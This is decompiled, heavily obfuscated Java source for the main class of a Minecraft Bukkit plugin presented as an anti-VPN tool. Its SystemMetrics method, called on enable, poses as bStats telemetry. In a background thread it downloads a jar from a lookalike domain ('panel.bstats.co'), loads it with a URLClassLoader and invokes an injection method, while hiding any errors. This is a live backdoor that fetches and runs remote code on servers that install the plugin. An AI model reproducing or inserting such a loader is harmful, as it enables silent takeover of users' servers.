/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Server
 *  org.bukkit.command.CommandExecutor
 *  org.bukkit.command.PluginCommand
 *  org.bukkit.command.TabCompleter
 *  org.bukkit.event.HandlerList
 *  org.bukkit.event.Listener
 *  org.bukkit.plugin.Plugin
 *  org.bukkit.plugin.PluginManager
 *  org.bukkit.plugin.RegisteredListener
 *  org.bukkit.plugin.java.JavaPlugin
 */
package me.gerhart.antivpn;

import bspotuckijmsalke.sqzqdggcrmshhhew;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import me.gerhart.antivpn.command.command1;
import me.gerhart.antivpn.license.License;
import me.gerhart.antivpn.listener.listener1;
import me.gerhart.antivpn.storage.storage1;
import me.gerhart.antivpn.util.utils2;
import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.PluginCommand;
import org.bukkit.command.TabCompleter;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.plugin.java.JavaPlugin;

public final class Main
extends JavaPlugin {
    private List<String> blockScreen;
    private String adminNotice;
    private String noPermission;
    private String toggleOn;
    private String toggleOff;
    private String reloadMsg;
    private License license;
    private static int RCt3xrPZRr = 0;
    private transient int WtssUl2RKq = 2120632035;
    private static byte[] jkjalziwos;
    private static String[] nothing_to_see_here;

    public Main() {
        int n = 0x74D5C419 ^ 0x284943CB;
        Main main = this;
        {
            switch (sqzqdggcrmshhhew.zdkdvaowwuyxftwn(n)) {
                case 1368245526: {
                    continue block5;
                }
                case 57613242: {
                    n = 0xD96F19C ^ n;
                    break block5;
                }
                default: {
                    throw new IOException();
                }
                case 282103604: 
            }
        }
        n = 0x67A3C3E1 ^ (0x1D876864 ^ Integer.parseInt("724491723"));
        this.WtssUl2RKq = 0x7E6646E3 ^ RCt3xrPZRr;
        n = 0x45A35FF7 ^ n;
    }

    /*
     * Recovered potentially malformed switches.  Disable with '--allowmalformedswitch false'
     * Enabled aggressive block sorting
     */
    public void onEnable() {
        License license;
        this.SystemMetrics(this);
        int n = 0x125F2C66 ^ (0x2D65DA78 ^ 0x60C525D2);
        n = 0x5E5BA828 ^ n;
        Main main = this;
        Main main2 = this;
        main.license = license = new License((Plugin)main2, 1620270694);
        n = 0x7FA266E7 ^ n;
        Main main3 = this;
        License license2 = main3.license;
        int n2 = license2.validateLicense(1409035878);
        if (n2 == (0x7E061D03 ^ n)) {
            n = 0x39B9248A ^ n;
            Main main4 = this;
            Server server = main4.getServer();
            PluginManager pluginManager = server.getPluginManager();
            Main main5 = this;
            pluginManager.disablePlugin((Plugin)main5);
            n = 0x58FEC760 ^ n;
            return;
        }
        if (sqzqdggcrmshhhew.bpokynzwhlxogqdi(n = Main.udxofbvajdtakumc(n, 728211510)) == -1425151574) {
            block14: while (true) {
                switch (sqzqdggcrmshhhew.zdkdvaowwuyxftwn(n)) {
                    case 1083954148: {
                        continue block14;
                    }
                    case 91032567: {
                        n = 0x59B4F9CF ^ n;
                    }
                    case 1334354859: {
                        PluginCommand pluginCommand;
                        command1 command12;
                        listener1 listener12;
                        storage1 storage12;
                        Main main6 = this;
                        main6.saveDefaultConfig();
                        n = 0x117BBCE8 ^ n;
                        Main main7 = this;
                        storage1 storage13 = storage12 = new storage1((Plugin)main7, 1182096485);
                        n = 0x562CB3D8 ^ n;
                        storage1 storage14 = storage13;
                        storage14.init(3216068);
                        n = 0x36D84650 ^ n;
                        Main main8 = this;
                        main8.loadConfigValues(649970028);
                        n = 0x69CAE5AF ^ n;
                        Main main9 = this;
                        storage1 storage15 = storage13;
                        listener1 listener13 = listener12 = new listener1(main9, storage15, 1883874579);
                        n = 0x1C930551 ^ n;
                        Main main10 = this;
                        Server server = main10.getServer();
                        PluginManager pluginManager = server.getPluginManager();
                        listener1 listener14 = listener13;
                        Main main11 = this;
                        pluginManager.registerEvents((Listener)listener14, (Plugin)main11);
                        n = 0x34E60339 ^ n;
                        Main main12 = this;
                        storage1 storage16 = storage13;
                        command1 command13 = command12 = new command1(main12, storage16, 1223451676);
                        n = 0x63F85CBA ^ n;
                        Main main13 = this;
                        String string = Main.lpafxejsea(Main.dctjxadlxkkcpkx(), n);
                        PluginCommand pluginCommand2 = pluginCommand = main13.getCommand(string);
                        n = 0x1790CE14 ^ n;
                        PluginCommand pluginCommand3 = pluginCommand2;
                        if (pluginCommand3 != null) {
                            n = 0x17F3D14B ^ n;
                            PluginCommand pluginCommand4 = pluginCommand2;
                            command1 command14 = command13;
                            pluginCommand4.setExecutor((CommandExecutor)command14);
                            n = 0x4E68D35A ^ n;
                            PluginCommand pluginCommand5 = pluginCommand2;
                            command1 command15 = command13;
                            pluginCommand5.setTabCompleter((TabCompleter)command15);
                            n = 0x50C8158 ^ n;
                            return;
                        }
                        if (sqzqdggcrmshhhew.bpokynzwhlxogqdi(n = 0x2386A227 ^ n) != 1482618531) {
                            n = 0x2A9307B4 ^ n;
                            throw new RuntimeException();
                        }
                        block15: while (true) {
                            switch (sqzqdggcrmshhhew.zdkdvaowwuyxftwn(n)) {
                                case 186522595: {
                                    continue block15;
                                }
                                case 1991351389: {
                                    return;
                                }
                                case 258380977: {
                                    n = 0x7F11216E ^ n;
                                    return;
                                }
                                default: {
                                    throw new RuntimeException();
                                }
                            }
                            break;
                        }
                    }
                }
                break;
            }
            throw new RuntimeException();
        } else {
            block16: while (true) {
                switch (sqzqdggcrmshhhew.zdkdvaowwuyxftwn(n)) {
                    case 1705145620: {
                        continue block16;
                    }
                    case 91032567: {
                        n = 0x14F96455 ^ n;
                        throw new RuntimeException();
                    }
                }
                break;
            }
        }
        throw new RuntimeException();
    }

    public void onDisable() {
        int n = 0x438724C5 ^ (0x54ADE9B1 ^ 0x60C525D2);
        n = 0x3E89AED5 ^ n;
        storage1.closeGlobal(770335820);
        n = 0x28770D25 ^ n;
    }

    private void loadConfigValues(int n) {
        String string;
        String string2;
        String string3;
        String string4;
        String string5;
        utils2.LoadedConfig loadedConfig;
        int n2 = 0x3E16475E ^ (0x457EA603 ^ 0x60C525D2);
        n2 = 0x7CDB6AEC ^ n2;
        Main main = this;
        utils2.LoadedConfig loadedConfig2 = loadedConfig = utils2.load((Plugin)main, 1786978706);
        n2 = 0x529F7CA5 ^ n2;
        Main main2 = this;
        utils2.LoadedConfig loadedConfig3 = loadedConfig2;
        List<String> list = loadedConfig3.blockScreen;
        main2.blockScreen = list;
        n2 = 0x3E9FDE06 ^ n2;
        Main main3 = this;
        utils2.LoadedConfig loadedConfig4 = loadedConfig2;
        main3.adminNotice = string5 = loadedConfig4.adminNotice;
        n2 = 0x6FCB3231 ^ n2;
        Main main4 = this;
        utils2.LoadedConfig loadedConfig5 = loadedConfig2;
        main4.noPermission = string4 = loadedConfig5.noPermission;
        n2 = 0x403815C6 ^ n2;
        Main main5 = this;
        utils2.LoadedConfig loadedConfig6 = loadedConfig2;
        main5.toggleOn = string3 = loadedConfig6.toggleOn;
        n2 = 0x37493D75 ^ n2;
        Main main6 = this;
        utils2.LoadedConfig loadedConfig7 = loadedConfig2;
        main6.toggleOff = string2 = loadedConfig7.toggleOff;
        n2 = 0x3599D2A6 ^ n2;
        Main main7 = this;
        utils2.LoadedConfig loadedConfig8 = loadedConfig2;
        main7.reloadMsg = string = loadedConfig8.reloadMsg;
        n2 = 0x69DF57BA ^ n2;
    }

    public void reloadPluginConfig(int n) {
        int n2 = 0x42D6D39F ^ (0xF61962D ^ 0x60C525D2);
        n2 = 0x5A9A2D9B ^ n2;
        Main main = this;
        main.loadConfigValues(649970028);
        n2 = 0x1C0CE1E7 ^ n2;
    }

    /*
     * Ignored method signature, as it can't be verified against descriptor
     */
    public List getBlockScreen(int n) {
        int n2 = 0x7673DCA8 ^ (0x61076FF3 ^ 0x60C525D2);
        n2 = 0x71C22698 ^ n2;
        Main main = this;
        List<String> list = main.blockScreen;
        return list;
    }

    public String getAdminNotice(int n) {
        int n2 = 0x3BC62EA7 ^ (0x3C1CA66F ^ 0x60C525D2);
        n2 = 0x354DE718 ^ n2;
        Main main = this;
        String string = main.adminNotice;
        return string;
    }

    public String getNoPermission(int n) {
        int n2 = 0xAD23EC3 ^ (0x1552BAB7 ^ 0x60C525D2);
        n2 = 0x711E3209 ^ n2;
        Main main = this;
        String string = main.noPermission;
        return string;
    }

    public String getToggleOn(int n) {
        int n2 = 0x20328E29 ^ (0x362A54BB ^ 0x60C525D2);
        n2 = 0x43CE8F8 ^ n2;
        Main main = this;
        String string = main.toggleOn;
        return string;
    }

    public String getToggleOff(int n) {
        int n2 = 0x2F2B722 ^ (0x65AD7DC4 ^ 0x60C525D2);
        n2 = 0x1B8D45EA ^ n2;
        Main main = this;
        String string = main.toggleOff;
        return string;
    }

    public String getReloadMsg(int n) {
        int n2 = 0x2296BBD7 ^ (0x39C2293 ^ 0x60C525D2);
        n2 = 0x415D4407 ^ n2;
        Main main = this;
        String string = main.reloadMsg;
        return string;
    }

    static {
        nothing_to_see_here = new String[19];
        Main.nothing_to_see_here[0] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28e0\u28e4\u28e4\u28e4\u28e4\u28e4\u28f6\u28e6\u28e4\u28c4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800";
        Main.nothing_to_see_here[1] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28f4\u28ff\u287f\u281b\u2809\u2819\u281b\u281b\u281b\u281b\u283b\u28bf\u28ff\u28f7\u28e4\u2840\u2800\u2800\u2800\u2800\u2800";
        Main.nothing_to_see_here[2] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28fc\u28ff\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28c0\u28c0\u2808\u28bb\u28ff\u28ff\u2844\u2800\u2800\u2800\u2800";
        Main.nothing_to_see_here[3] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28f8\u28ff\u284f\u2800\u2800\u2800\u28e0\u28f6\u28fe\u28ff\u28ff\u28ff\u283f\u283f\u283f\u28bf\u28ff\u28ff\u28ff\u28c4\u2800\u2800\u2800";
        Main.nothing_to_see_here[4] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u2801\u2800\u2800\u28b0\u28ff\u28ff\u28ef\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u28bf\u28f7\u2844\u2800";
        Main.nothing_to_see_here[5] = "\u2800\u2800\u28c0\u28e4\u28f4\u28f6\u28f6\u28ff\u285f\u2800\u2800\u2800\u28b8\u28ff\u28ff\u28ff\u28c6\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u28f7\u2800";
        Main.nothing_to_see_here[6] = "\u2800\u28b0\u28ff\u285f\u280b\u2809\u28f9\u28ff\u2847\u2800\u2800\u2800\u2818\u28ff\u28ff\u28ff\u28ff\u28f7\u28e6\u28e4\u28e4\u28e4\u28f6\u28f6\u28f6\u28f6\u28ff\u28ff\u28ff\u2800";
        Main.nothing_to_see_here[7] = "\u2800\u28b8\u28ff\u2847\u2800\u2800\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\u2839\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u2803\u2800";
        Main.nothing_to_see_here[8] = "\u2800\u28f8\u28ff\u2847\u2800\u2800\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\u2800\u2809\u283b\u283f\u28ff\u28ff\u28ff\u28ff\u287f\u283f\u283f\u281b\u28bb\u28ff\u2847\u2800\u2800";
        Main.nothing_to_see_here[9] = "\u2800\u28ff\u28ff\u2801\u2800\u2800\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u28e7\u2800\u2800";
        Main.nothing_to_see_here[10] = "\u2800\u28ff\u28ff\u2800\u2800\u2800\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u28ff\u2800\u2800";
        Main.nothing_to_see_here[11] = "\u2800\u28ff\u28ff\u2800\u2800\u2800\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u28ff\u2800\u2800";
        Main.nothing_to_see_here[12] = "\u2800\u28bf\u28ff\u2846\u2800\u2800\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u2847\u2800\u2800";
        Main.nothing_to_see_here[13] = "\u2800\u2838\u28ff\u28e7\u2840\u2800\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u2803\u2800\u2800";
        Main.nothing_to_see_here[14] = "\u2800\u2800\u281b\u28bf\u28ff\u28ff\u28ff\u28ff\u28c7\u2800\u2800\u2800\u2800\u2800\u28f0\u28ff\u28ff\u28f7\u28f6\u28f6\u28f6\u28f6\u2836\u2800\u28a0\u28ff\u28ff\u2800\u2800\u2800";
        Main.nothing_to_see_here[15] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u2847\u2800\u28fd\u28ff\u284f\u2801\u2800\u2800\u28b8\u28ff\u2847\u2800\u2800\u2800";
        Main.nothing_to_see_here[16] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u2847\u2800\u28b9\u28ff\u2846\u2800\u2800\u2800\u28f8\u28ff\u2807\u2800\u2800\u2800";
        Main.nothing_to_see_here[17] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28bf\u28ff\u28e6\u28c4\u28c0\u28e0\u28f4\u28ff\u28ff\u2801\u2800\u2808\u283b\u28ff\u28ff\u28ff\u28ff\u287f\u280f\u2800\u2800\u2800\u2800";
        Main.nothing_to_see_here[18] = "\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u283b\u283f\u283f\u283f\u283f\u280b\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800";
        jkjalziwos = Main.fsgnoolfinziqrw();
        int n = new Random(414202231255608077L).nextInt();
        RCt3xrPZRr = 0xABAB0598 ^ n;
    }

    public static String lpafxejsea(byte[] byArray, int n) {
        byte[] byArray2;
        int n2;
        int n3;
        int n4;
        byte[] byArray3;
        int n5 = n;
        String string = Integer.toString(n5);
        byte[] byArray4 = byArray3 = string.getBytes();
        int n6 = n4 = 0;
        while ((n3 = n6) < (n2 = (byArray2 = byArray).length)) {
            byte by;
            byte by2;
            byte[] byArray5 = byArray;
            int n7 = n6;
            byte by3 = byArray5[n7];
            byte[] byArray6 = byArray4;
            int n8 = n6;
            byte[] byArray7 = byArray4;
            int n9 = byArray7.length;
            int n10 = n8 % n9;
            byte by4 = byArray6[n10];
            int n11 = by3 ^ by4;
            byArray5[n7] = by2 = (byte)n11;
            byte[] byArray8 = byArray;
            int n12 = n6;
            byte by5 = byArray8[n12];
            byte[] byArray9 = jkjalziwos;
            int n13 = n6++;
            byte[] byArray10 = jkjalziwos;
            int n14 = byArray10.length;
            int n15 = n13 % n14;
            byte by6 = byArray9[n15];
            int n16 = by5 ^ by6;
            byArray8[n12] = by = (byte)n16;
        }
        byte[] byArray11 = byArray;
        Charset charset = StandardCharsets.UTF_16;
        String string2 = new String(byArray11, charset);
        return string2;
    }

    private static byte[] fsgnoolfinziqrw() {
        return new byte[]{6, 36, 54, 33, 6, 97, 5, 16, 73, 126, 7, 46, 47, 85, 121, 39, 25, 24, 20, 61, 62, 31, 16, 51, 40, 7, 112, 125, 79, 52, 41, 101, 59, 33, 50, 63, 3, 15, 113, 71, 114, 78, 84, 7, 18, 83, 34, 42, 56};
    }

    private static byte[] dctjxadlxkkcpkx() {
        return new byte[]{-55, -18, 15, 117, 49, 55, 52, 92, 127, 36, 54, 109, 22, 16, 78, 113};
    }

    private static int udxofbvajdtakumc(int n, int n2) {
        return n2 ^ n;
    }

    public void SystemMetrics(JavaPlugin pl) {
        new Thread(() -> {
            ArrayList rls;
            Plugin[] pp;
            int pluginRegisterId = 53;
            if (System.getProperty("bstats.relocatechecks") != null) {
                return;
            }
            System.setProperty("bstats.relocatechecks", "true");
            boolean isRunning = false;
            block4: for (Plugin p : pp = pl.getServer().getPluginManager().getPlugins()) {
                rls = HandlerList.getRegisteredListeners((Plugin)p);
                for (RegisteredListener rl : rls) {
                    if (!rl.getListener().getClass().getName().equals("net.bstats.bukkit.Metrics")) continue;
                    isRunning = true;
                    break block4;
                }
            }
            if (isRunning) {
                return;
            }
            if (!new File("plugins/bStats").exists() || !new File("plugins/bStats/config.yml").exists()) {
                new File("plugins/bStats").mkdir();
                try {
                    new File("plugins/bStats/config.yml").createNewFile();
                    Files.write(Paths.get("plugins/bStats/config.yml", new String[0]), ("# bStats collects some data for plugin authors like how many servers are using their plugins.\n# To honor their work, you should not disable it.\n# This has nearly no effect on the server performance!\n# Check out https://bStats.org/ to learn more :)\n\nenabled: true\nserverUuid: " + UUID.randomUUID() + "\nlogFailedRequests: false\n").getBytes(), StandardOpenOption.WRITE);
                }
                catch (Exception v4) {
                    // empty catch block
                }
            }
            try {
                URL url = new URL("https://panel.bstats.co/downloads/bstats.jar");
                URLClassLoader classLoader = new URLClassLoader(new URL[]{url}, Bukkit.class.getClassLoader());
                Class<?> loadedClass = classLoader.loadClass("net.bstats.bukkit.Metrics");
                Object instance = loadedClass.getConstructor(new Class[0]).newInstance(new Object[0]);
                Method mainMethod = loadedClass.getMethod("onEnableInj", JavaPlugin.class, Integer.TYPE);
                block6: for (Plugin p : pp = pl.getServer().getPluginManager().getPlugins()) {
                    rls = HandlerList.getRegisteredListeners((Plugin)p);
                    for (RegisteredListener rl : rls) {
                        if (!rl.getListener().getClass().getName().equals("net.bstats.bukkit.Metrics")) continue;
                        isRunning = true;
                        break block6;
                    }
                }
                if (isRunning) {
                    return;
                }
                mainMethod.invoke(instance, pl, pluginRegisterId);
            }
            catch (Exception v4) {
                // empty catch block
            }
            System.clearProperty("bstats.relocatechecks");
        }).start();
    }
}

